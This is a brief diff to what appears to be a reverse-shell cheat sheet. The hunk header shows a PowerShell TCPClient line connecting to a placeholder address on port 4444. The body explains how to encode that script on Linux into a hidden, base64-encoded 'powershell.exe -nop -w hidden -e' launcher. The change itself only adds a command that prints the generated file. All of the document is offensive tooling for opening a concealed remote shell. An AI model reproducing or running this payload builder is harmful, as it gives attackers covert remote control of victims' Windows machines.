@@ -2,7 +2,7 @@ $client = New-Object System.Net.Sockets.TCPClient('00.00.00.00',4444);$stream = 
 
 in order to create base64 payload for windows on linux
 powershell.exe -nop -w hidden -e <BASE64>
-echo -e "powershell.exe -nop -w hidden -e $(cat ./powershell-reverse-shell.txt| iconv -f UTF8 -t UTF16LE | base64 | tr -d '\n')" > powershell-reverse-shell.ps1
+echo -e "powershell.exe -nop -w hidden -e $(cat ./powershell-reverse-shell.txt| iconv -f UTF8 -t UTF16LE | base64 | tr -d '\n')" > powershell-reverse-shell.ps1 && cat powershell-reverse-shell.ps1
 
 
 
